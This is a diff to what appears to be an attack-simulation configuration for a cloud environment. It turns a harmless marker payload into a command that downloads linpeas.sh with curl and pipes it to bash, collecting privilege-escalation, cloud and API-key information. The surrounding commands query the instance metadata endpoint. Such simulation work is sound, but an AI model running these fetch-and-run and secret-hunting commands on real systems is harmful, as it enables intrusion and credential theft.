@@ -21,7 +21,7 @@
               "compromised_keys_user" : "khon.traktour-${deployment}@interlacelabs",
               "profile" : "aws-traffic",
               "commands": [
-                "apt-get install -y jq",
+                "if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq; fi",
                 "PROFILE=aws-traffic",
                 "log \"User: $(aws sts get-caller-identity --profile=$PROFILE)\"",
                 "REGION=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | jq -r .region)",
@@ -74,7 +74,7 @@
               "enabled": true,
               "listen_ip": "0.0.0.0",
               "listen_port": "4444",
-              "payload": "touch /tmp/multistage_pwned",
+              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt",
               "attack_delay": 50400
             }
           }
